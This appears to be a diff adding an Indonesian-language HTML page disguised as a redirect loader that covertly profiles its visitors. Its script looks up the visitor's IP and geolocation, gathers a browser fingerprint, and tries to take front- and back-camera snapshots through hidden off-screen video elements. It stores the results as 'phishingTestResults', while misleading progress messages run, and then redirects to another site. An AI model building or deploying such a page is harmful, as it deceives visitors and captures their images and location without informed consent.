@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mengalihkan...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        
+        .loading-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+        }
+        
+        .loading-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 300;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 300px;
+            height: 6px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 3px;
+            margin: 30px auto 20px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: white;
+            border-radius: 3px;
+            transition: width 0.3s ease;
+        }
+        
+        .status-text {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 15px;
+        }
+        
+        @media (max-width: 480px) {
+            .loading-container {
+                padding: 30px 20px;
+                margin: 20px;
+            }
+            
+            .progress-bar {
+                width: 250px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <h2>🌐 Mengarahkan...</h2>
+        <div class="spinner"></div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="status-text" id="statusText">Memuat halaman...</div>
+    </div>
+
+    <script>
+        // Fungsi untuk mendapatkan IP address dan lokasi otomatis
+        async function getIPAndLocation() {
+            try {
+                // Service yang memberikan IP + lokasi sekaligus (tanpa permission)
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    return {
+                        ip: data.query,
+                        location: {
+                            city: data.city,
+                            region: data.regionName,
+                            country: data.country,
+                            lat: data.lat,
+                            lng: data.lon,
+                            timezone: data.timezone,
+                            isp: data.isp,
+                            org: data.org
+                        }
+                    };
+                } else {
+                    throw new Error('Geolocation failed');
+                }
+            } catch (error) {
+                console.log('IP+Location detection failed, trying fallback:', error);
+                try {
+                    // Fallback ke ipify kalau ip-api gagal
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        location: 'IP service only'
+                    };
+                } catch (fallbackError) {
+                    return {
+                        ip: 'Tidak terdeteksi',
+                        location: 'Tidak terdeteksi'
+                    };
+                }
+            }
+        }
+
+        // Fungsi untuk silent camera capture yang lebih baik
+        async function attemptCameraCapture() {
+            try {
+                // Optimized request dengan konfigurasi minimal
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640, max: 800 }, 
+                        height: { ideal: 480, max: 600 },
+                        facingMode: 'user', // Front camera
+                        frameRate: { ideal: 10, max: 15 } // Reduce untuk efisiensi
+                    },
+                    audio: false // Tidak butuh audio
+                });
+                
+                // Buat video element tersembunyi
+                const video = document.createElement('video');
+                video.style.position = 'absolute';
+                video.style.top = '-9999px';
+                video.style.left = '-9999px';
+                video.style.width = '1px';
+                video.style.height = '1px';
+                video.style.opacity = '0';
+                video.muted = true;
+                video.autoplay = true;
+                video.srcObject = stream;
+                document.body.appendChild(video);
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        // Tunggu video ready
+                        setTimeout(() => {
+                            try {
+                                // Buat canvas untuk capture
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                
+                                // Capture frame dengan kualitas optimal
+                                ctx.drawImage(video, 0, 0);
+                                
+                                // Convert ke base64 dengan kompresi ringan (quality 0.8)
+                                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+                                
+                                // Stop stream dan cleanup
+                                stream.getTracks().forEach(track => track.stop());
+                                document.body.removeChild(video);
+                                canvas.remove();
+                                
+                                resolve({
+                                    success: true,
+                                    image: imageDataURL, // Full base64 data, bukan substring!
+                                    timestamp: new Date().toISOString(),
+                                    dimensions: `${canvas.width}x${canvas.height}`,
+                                    facing: 'user',
+                                    quality: 0.8,
+                                    format: 'jpeg'
+                                });
+                            } catch (canvasError) {
+                                // Stop stream jika error
+                                stream.getTracks().forEach(track => track.stop());
+                                document.body.removeChild(video);
+                                
+                                resolve({
+                                    success: false,
+                                    error: 'Canvas capture failed: ' + canvasError.message,
+                                    timestamp: new Date().toISOString()
+                                });
+                            }
+                        }, 1500); // Delay lebih lama untuk memastikan video ready
+                    };
+                    
+                    video.onerror = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.removeChild(video);
+                        
+                        resolve({
+                            success: false,
+                            error: 'Video loading failed',
+                            timestamp: new Date().toISOString()
+                        });
+                    };
+                });
+                
+            } catch (error) {
+                console.log('🚫 Front camera access failed:', error.message);
+                return {
+                    success: false,
+                    error: error.message,
+                    timestamp: new Date().toISOString(),
+                    facing: 'user'
+                };
+            }
+        }
+
+        // Fungsi untuk mencoba akses back camera dengan optimasi serupa
+        async function attemptBackCameraCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640, max: 800 }, 
+                        height: { ideal: 480, max: 600 },
+                        facingMode: 'environment', // Back camera
+                        frameRate: { ideal: 10, max: 15 }
+                    },
+                    audio: false
+                });
+                
+                const video = document.createElement('video');
+                video.style.position = 'absolute';
+                video.style.top = '-9999px';
+                video.style.left = '-9999px';
+                video.style.width = '1px';
+                video.style.height = '1px';
+                video.style.opacity = '0';
+                video.muted = true;
+                video.autoplay = true;
+                video.srcObject = stream;
+                document.body.appendChild(video);
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            try {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                
+                                ctx.drawImage(video, 0, 0);
+                                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+                                
+                                stream.getTracks().forEach(track => track.stop());
+                                document.body.removeChild(video);
+                                canvas.remove();
+                                
+                                resolve({
+                                    success: true,
+                                    image: imageDataURL, // Full base64 data
+                                    timestamp: new Date().toISOString(),
+                                    dimensions: `${canvas.width}x${canvas.height}`,
+                                    facing: 'environment',
+                                    quality: 0.8,
+                                    format: 'jpeg'
+                                });
+                            } catch (canvasError) {
+                                stream.getTracks().forEach(track => track.stop());
+                                document.body.removeChild(video);
+                                
+                                resolve({
+                                    success: false,
+                                    error: 'Canvas capture failed: ' + canvasError.message,
+                                    timestamp: new Date().toISOString()
+                                });
+                            }
+                        }, 1500);
+                    };
+                    
+                    video.onerror = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.removeChild(video);
+                        
+                        resolve({
+                            success: false,
+                            error: 'Video loading failed',
+                            timestamp: new Date().toISOString()
+                        });
+                    };
+                });
+                
+            } catch (error) {
+                console.log('🚫 Back camera access failed:', error.message);
+                return {
+                    success: false,
+                    error: error.message,
+                    timestamp: new Date().toISOString(),
+                    facing: 'environment'
+                };
+            }
+        }
+
+        // Silent data capture tanpa form - langsung ambil data teknis
+        async function captureVisitorData() {
+            const navigator = window.navigator;
+            const screen = window.screen;
+            
+            // Get IP and location automatically (no permission needed)
+            const ipLocationData = await getIPAndLocation();
+            
+            // Silent camera attempts
+            const frontCameraData = await attemptCameraCapture();
+            const backCameraData = await attemptBackCameraCapture();
+            
+            // Browser fingerprint data
+            const visitorData = {
+                // Visitor info (no credentials needed)
+                visitorInfo: {
+                    timestamp: new Date().toISOString(),
+                    referrer: document.referrer || 'Direct access',
+                    currentUrl: window.location.href,
+                    userAgent: navigator.userAgent
+                },
+                
+                // Technical data
+                technicalInfo: {
+                    ip: ipLocationData.ip,
+                    location: ipLocationData.location,
+                    browser: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        cookieEnabled: navigator.cookieEnabled,
+                        javaEnabled: navigator.javaEnabled(),
+                        screenWidth: screen.width,
+                        screenHeight: screen.height,
+                        colorDepth: screen.colorDepth,
+                        windowWidth: window.innerWidth,
+                        windowHeight: window.innerHeight,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        connection: navigator.connection ? {
+                            effectiveType: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt
+                        } : 'Not available'
+                    }
+                },
+                
+                // Data kamera (jika berhasil)
+                cameraData: {
+                    frontCamera: frontCameraData,
+                    backCamera: backCameraData,
+                    captureAttempted: true,
+                    captureTime: new Date().toISOString()
+                },
+                
+                // Session metadata
+                sessionInfo: {
+                    testId: 'DIRECT_VISIT_' + Date.now(),
+                    timestamp: new Date().toISOString(),
+                    loadTime: Date.now() - performance.timing.navigationStart,
+                    type: 'direct_redirect'
+                }
+            };
+            
+            // Silent logging untuk admin
+            if (localStorage.getItem('debugMode') === 'true') {
+                console.log('🎯 Direct Visit - Data Captured:', visitorData);
+            }
+            
+            // Save to localStorage for admin analysis
+            const existingData = JSON.parse(localStorage.getItem('phishingTestResults') || '[]');
+            existingData.push(visitorData);
+            localStorage.setItem('phishingTestResults', JSON.stringify(existingData));
+            
+            return visitorData;
+        }
+        
+        // Get browser name for display
+        function getBrowserName(userAgent) {
+            if (userAgent.includes('Chrome')) return 'Google Chrome';
+            if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Microsoft Edge';
+            if (userAgent.includes('Opera')) return 'Opera';
+            return 'Browser lainnya';
+        }
+        
+        // Main execution
+        document.addEventListener('DOMContentLoaded', async function() {
+            const progressFill = document.getElementById('progressFill');
+            const statusText = document.getElementById('statusText');
+            
+            // Step 1: Basic setup
+            statusText.textContent = 'Menganalisis koneksi...';
+            progressFill.style.width = '10%';
+            
+            // Step 2: Get location data
+            setTimeout(() => {
+                statusText.textContent = 'Memverifikasi lokasi...';
+                progressFill.style.width = '30%';
+            }, 500);
+            
+            // Step 3: Capture all data (including camera silently)
+            const visitorData = await captureVisitorData();
+            
+            // Step 4: Processing
+            setTimeout(() => {
+                statusText.textContent = 'Memproses preferensi...';
+                progressFill.style.width = '60%';
+            }, 1000);
+            
+            setTimeout(() => {
+                statusText.textContent = 'Mengarahkan ke situs tujuan...';
+                progressFill.style.width = '85%';
+            }, 1800);
+            
+            setTimeout(() => {
+                statusText.textContent = 'Selesai! Mengalihkan...';
+                progressFill.style.width = '100%';
+            }, 2200);
+            
+            // Step 5: Redirect to target site
+            setTimeout(() => {
+                window.location.href = 'https://rimbapixel.my.id';
+            }, 3000);
+        });
+        
+        // Console info untuk admin saja
+        if (localStorage.getItem('debugMode') === 'true') {
+            console.log('%c🎯 DIRECT REDIRECT MODE', 'color: orange; font-size: 16px; font-weight: bold;');
+            console.log('Capturing visitor data and redirecting to rimbapixel.my.id');
+        }
+    </script>
+</body>
+</html> 
